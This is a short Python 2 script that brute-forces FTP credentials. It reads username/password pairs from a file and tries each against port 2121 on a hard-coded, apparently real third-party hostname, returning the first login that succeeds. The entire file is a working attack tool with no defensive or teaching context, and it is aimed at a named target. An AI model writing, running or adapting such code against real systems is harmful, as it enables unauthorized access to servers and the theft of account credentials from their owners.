# coding=UTF-8
import ftplib

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying:" + userName + "/" + passWord
        try:
            ftp = ftplib.FTP()
            ftp.set_debuglevel(1)
            ftp.connect(hostname,2121)
            ftp.login(userName,passWord)
            print '\n[*]' + str(hostname) + ' FTP Logon Succeeded:' + userName + "/" + passWord
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)

host = 'dev.huangjinqianbao.com'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)
